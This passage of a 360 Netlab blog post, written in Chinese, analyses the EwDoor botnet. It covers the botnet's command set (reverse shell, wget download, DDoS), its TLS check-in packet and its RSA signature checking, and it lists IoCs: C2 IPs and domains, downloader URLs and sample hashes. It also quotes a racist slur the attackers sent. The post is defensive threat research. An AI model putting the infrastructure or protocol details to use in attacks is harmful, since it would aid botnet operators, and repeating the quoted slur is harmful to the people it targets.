+</tr>
+<tr>
+<td>exec2</td>
+<td>run cmd via popen</td>
+</tr>
+<tr>
+<td>pscan</td>
+<td>port scan</td>
+</tr>
+<tr>
+<td>uname</td>
+<td>exec &quot;uname&quot; cmd</td>
+</tr>
+<tr>
+<td>update</td>
+<td>write &quot;/tmp/.ewupdate&quot;</td>
+</tr>
+<tr>
+<td>reverse</td>
+<td>reverse shell</td>
+</tr>
+<tr>
+<td>download</td>
+<td>download file  via wget</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ul>
+<h3 id="015016versionprotocol">0.15,0.16 version protocol</h3>
+<ul>
+<li>
+<p>TLS连接</p>
+</li>
+<li>
+<p>上线</p>
+<p>通过以下代码构造上线包，上线数据里包括从index 0解密出的字串，版本号，设备主机名，设备网卡地址等信息。</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_regv2.png"  width="860px" />
+<p>实际产生的流量如下所示：</p>
+<pre><code>00000000  00 3b 00 00 00 00 00 00  00 00 02 00 06 30 2e 31  |.;...........0.1|
+00000010  36 2e 30 00 13 4f 72 4f  69 62 32 7a 43 49 57 61  |6.0..OrOib2zCIWa|
+00000020  31 30 76 32 62 75 6e 4a  00 0b 64 65 62 69 61 6e  |10v2bunJ..debian|
+00000030  2d 6d 69 70 73 00 06 31  32 33 34 35 36           |-mips..123456|
+0000003d
+</code></pre>
+</li>
+<li>
+<p>指令验签</p>
+<p>成功上线后，Ewdoor等待C2下发指令，指令由&quot;len(2 bytes)+Signature(512 bytes)+ sessionid(8bytes)+cmd&quot;4部分组成，当收到指令时，Ewdoor通过<code>proto_verify_signature</code>函数对指令进行数字签名校验，只有通过校验的指令，才会执行。Ewdoor通过这种技术手段保证整个的网络完全可控，不被他人窃取。</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_sig.png"  width="860px" />
+<p>签名校验使用的是RSA-SHA256方式，其中pubkey是加密存放在样本中，一共550字节，逐一和0x2a异或后，就能得到真正的公钥。</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_key.png"  width="860px" />
+<p>以实际中收到的payload为例，可以按上文所述的格式将其分成4部分。</p>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_payload.png"  width="860px" />
+<p>通过mbedtls自带的pk_verify工具可以很方便的对上面的payload进行校验。</p>
+<pre><code>&gt;md5 pubkey
+9dba72160f5d02ebdc8a78bcb27defa *pubkey
+&gt;md5 msg
+5a6d3b1018b5e7543ee6f73d6c9df727 *msg
+&gt;md5 msg.sig
+10acc6e0e0447d900d6d46c66c8f4406 *msg.sig
+&gt;cat msg  | hexdump -C
+00000000  00 00 00 00 00 00 01 07  01
+&gt;pk_verify.exe pubkey msg
+. Reading public key from 'pubkey'
+. Verifying the SHA-256 signature
+. OK (the signature is valid)
+</code></pre>
+<p>当指令通过验签后，刚执行具体的命令，此处的命令编号为1，是心跳指令。</p>
+<ul>
+<li>支持的指令</li>
+</ul>
+<p>0.15，0.16版本支持的指令如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th>cmd index</th>
+<th>purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>heartbeat</td>
+</tr>
+<tr>
+<td>2</td>
+<td>port scan</td>
+</tr>
+<tr>
+<td>4</td>
+<td>exec &quot;uname&quot; cmd</td>
+</tr>
+<tr>
+<td>5</td>
+<td>download file via wget</td>
+</tr>
+<tr>
+<td>6</td>
+<td>update, write &quot;/var/tmp/.ewupdate&quot;</td>
+</tr>
+<tr>
+<td>7</td>
+<td>run cmd via bash</td>
+</tr>
+<tr>
+<td>8</td>
+<td>run cmd via popen</td>
+</tr>
+<tr>
+<td>9</td>
+<td>ddos attack</td>
+</tr>
+</tbody>
+</table>
+</li>
+</ul>
+<h2 id="">花絮</h2>
+<ol>
+<li>Ewdoor的作者是个修BUG的小能手！<br>
+修复前文所述的0.12版本中的C2 BUG只用了16分钟。</li>
+</ol>
+<pre><code>eef0035f971622cc5f48e164ca28a95f; gzip compressed data, was &quot;ramdisk.img&quot;, from Unix, last modified: Wed Oct 27 17:45:08 2021, max compression
+
+fbbacfb20e487265c7fdb30817717f26; gzip compressed data, was &quot;ramdisk.img&quot;, from Unix, last modified: Wed Oct 27 18:01:33 2021, max compression
+</code></pre>
+<ol start="2">
+<li>
+<p>EwDoor的作者是<code>俄罗斯恐怖摇滚青年</code>？<br>
+第一次使用的密钥<code>TheMagicalMysteryTourIsComingToTakeYouAway!</code>,是The Beatles乐队的歌词。<br>
+第二次使用的密钥<code>холодно в доме папа в тужурке мама дочуркою топит в печурке!</code>，Google翻译为“<strong>it's cold in the house, dad in a jacket, mom drowns her daughter in the stove!</strong>”，妥妥的一句话恐怖故事，看着让人不寒而栗。</p>
+</li>
+<li>
+<p>EwDoor的作者非常凶!<br>
+11月发现我们的蜜罐IP后，在paylaod里骂我们，<code>kill yourself you fucking nigger chink kike, this is a shitty honeypot, DDoS coming</code>，用词相当的种族歧视，政治不正确，直言要攻击，吓得我们&quot;瑟瑟发抖&quot;。<br>
+<img src="https://blog.netlab.360.com/content/images/2021/11/ew_gos2.png"  width="860px" /></p>
+</li>
+</ol>
+<h2 id="">联系我们</h2>
+<p>感兴趣的读者，可以在<a href="https://twitter.com/360Netlab?ref=blog.netlab.360.com">twitter</a>或者在微信公众号 360Netlab上联系我们。</p>
+<h2 id="ioc">IoC</h2>
+<h3 id="c2">C2</h3>
+<pre><code>185.10.68.20
+rtmxvd.iunno.se
+ekgmua.zapto.org
+boatreviews.xpresit.net
+a.rtmxvdio.net
+a.hatbowlu3hf.ru
+a.hatbowlrtx.su
+45.141.157.217
+rtmxvd.iunno.se
+hhqnyy.zapto.org
+besthatsite.mooo.com
+b.rtmxvdio.net
+b.hatbowlu3hf.ru
+b.hatbowlrtx.su
+
+port: 53， 443，13433
+</code></pre>
+<h3 id="downloader">Downloader</h3>
+<pre><code>http://185[.10.68.20:1234/ew-new.sh
+http://185[.10.68.20:1234/ew.sh
+http://185[.10.68.20:1234/prod/mips
+http://185[.10.68.20:1234/ramdisk.img.gz
+http://212[.193.30.209/61501e55/mips
+http://212[.193.30.209/859b6cfa.sh
+</code></pre>
+<h3 id="samplemd5">Sample MD5</h3>
+<pre><code>007c28d9a0ccfb10c478689fd63e0de0
+128331f1c808ee385375dd54d0609ebc
+46c18a8e93a863053952985a39bd7d63
+4f0841ac08a27d8b3d56cbd03fb68ad8
+5c4390e1668856cc7f72499a72f935d6
+62bc8899a353921ac685cabb63de97b3
+67ccb3cf1f4f57f5a0ded4d20bc91d73
+7d4937e27d0fd75dd6159ffe53ebb505
+84b3df62ed45bea57d0dd85e80f0dc07
+8794d23cad330de803294a2a1adb128b
+abaed830fe09e92ee434236d3db01e08
+b81ade4f18c2df58adef301f401e8a02
+ca6eb890853434ab9a0f8cdbab0965ea
+ddf96434bdb7b449ddcc925e6a5b3095
+eef0035f971622cc5f48e164ca28a95f
+fbbacfb20e487265c7fdb30817717f26
+</code></pre>
+<!--kg-card-end: markdown--><p></p>
+    </section>
+
+
+</article>
+</main>
+
+
+
+
+            <aside class="read-more-wrap outer">
+                <div class="read-more inner">
+                        
+<article class="post-card post no-image keep-ratio">
+
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/911s5/">
+            <header class="post-card-header">
+                <div class="post-card-tags">
+                </div>
+                <h2 class="post-card-title">
+                    僵尸网络911 S5的数字遗产
+                </h2>
+            </header>
+                <div class="post-card-excerpt">概述
+
+2024年5月29日，美国司法部发布通告，声称其执法活动摧毁了&quot;史上最大的僵尸网络&quot; 911 S5，查封了相关域名，并且逮捕了其管理员YunHe Wang。Wang及其同伙通过创建并分发包含恶意代码的免费VPN程序感染用户，并且在名为911 S5的住宅代理服务中出售对被感染设备构成的代理网络的访问权。
+
+按照360威胁情报中心的分析，911S5从2014年开始运营，到2022年7月关停，在2023年10月又摇身一变，化名CloudRouter继续其肮脏生意，终于在2024年5月被多国联合执法摧毁。911S5的僵尸网络运行时间长、涉及多个国家的19M个IP地址、行为高调，虽然经过执法行动后大势已去，但是其数字遗产仍然对网络空间构成了现实且显著的威胁，下文是我们对威胁分析的结果。
+
+
+“空手套白狼”的911 S5
+
+911S5出售的代理服务背后是数千万被感染的设备。受害者主动或被动下载捆绑了恶意代码的软件、免费VPN程序等。在程序启动后，恶意代码将会创建持久化服务作为后门，为911S5客户提供代理服务。
+
+在2023年以前，911S5使用的免费VPN包括:ProxyGate、Mas</div>
+        </a>
+
+        <footer class="post-card-meta">
+            <time class="post-card-meta-date" datetime="2024-06-14">14 Jun 2024</time>
+                <span class="post-card-meta-length">7 min read</span>
+        </footer>
+
+    </div>
+
+</article>
+                        
+<article class="post-card post no-image keep-ratio">
+
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/headsup_xdr33_variant_of_ciahive_emeerges/">
+            <header class="post-card-header">
+                <div class="post-card-tags">
+                </div>
+                <h2 class="post-card-title">
+                    Heads up! Xdr33, A Variant Of CIA’s HIVE  Attack Kit Emerges
+                </h2>
+            </header>
+                <div class="post-card-excerpt">Overview
+
+
+On Oct 21, 2022, 360Netlab&#39;s honeypot system captured a suspicious ELF file ee07a74d12c0bb3594965b51d0e45b6f, which propagated via F5 vulnerability with zero VT detection, our system observces that it communicates with IP 45.9.150.144 using SSL with forged Kaspersky certificates, this caught our attention. After further lookup,</div>
+        </a>
+
+        <footer class="post-card-meta">
+            <time class="post-card-meta-date" datetime="2023-01-10">10 Jan 2023</time>
+                <span class="post-card-meta-length">13 min read</span>
+        </footer>
+
+    </div>
+
+</article>
+                        
+<article class="post-card post no-image keep-ratio">
+
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/warning-hive-variant-xdr33-is-coming_cn/">
+            <header class="post-card-header">
+                <div class="post-card-tags">
+                </div>
+                <h2 class="post-card-title">
+                    警惕：魔改后的CIA攻击套件Hive进入黑灰产领域
+                </h2>
+            </header>
+                <div class="post-card-excerpt">概述
+
+
+2022年10月21日，360Netlab的蜜罐系统捕获了一个通过F5漏洞传播，VT 0检测的可疑ELF文件ee07a74d12c0bb3594965b51d0e45b6f，流量监控系统提示它和IP45.9.150.144产生了SSL流量，而且双方都使用了伪造的Kaspersky证书，这引起了我们的关注。经过分析，我们确认它由CIA被泄露的Hive项目server源码改编而来。这是我们首次捕获到在野的CIA HIVE攻击套件变种，基于其内嵌Bot端证书的CN=xdr33， 我们内部将其命名为xdr33。关于CIA的Hive项目，互联网中有大量的源码分析的文章，读者可自行参阅，此处不再展开。
+
+
+概括来说，xdr33是一个脱胎于CIA Hive项目的后门木马，主要目的是收集敏感信息，为后续的入侵提供立足点。从网络通信来看，xdr33使用XTEA或AES算法对原始流量进行加密，并采用开启了Client-Certificate Authentication模式的SSL对流量做进一步的保护；从功能来说，主要有beacon，trigger两大任务，其中beacon是周期性向硬编码的Be</div>
+        </a>
+
+        <footer class="post-card-meta">
+            <time class="post-card-meta-date" datetime="2023-01-09">09 Jan 2023</time>
+                <span class="post-card-meta-length">17 min read</span>
+        </footer>
+
+    </div>
+
+</article>
+                </div>
+            </aside>
+
+
+
+    </div>
+
+    <footer class="site-footer outer">
+        <div class="inner">
+            <section class="copyright"><a href="https://blog.netlab.360.com">360 Netlab Blog - Network Security Research Lab at 360</a> &copy; 2026</section>
+            <nav class="site-footer-nav">
+                <ul class="nav">
+    <li class="nav-sign-up"><a href="#/portal/">Sign up</a></li>
+</ul>
+
+            </nav>
+            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
+        </div>
+    </footer>
+
+</div>
+
+    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="pswp__bg"></div>
+
+    <div class="pswp__scroll-wrap">
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<script
+    src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
+    crossorigin="anonymous">
+</script>
+<script src="/assets/built/casper.js?v=00a3abdcf6"></script>
+<script>
+$(document).ready(function () {
+    // Mobile Menu Trigger
+    $('.gh-burger').click(function () {
+        $('body').toggleClass('gh-head-open');
+    });
+    // FitVids - Makes video embeds responsive
+    $(".gh-content").fitVids();
+});
+</script>
+
+
+
+</body>
+</html>
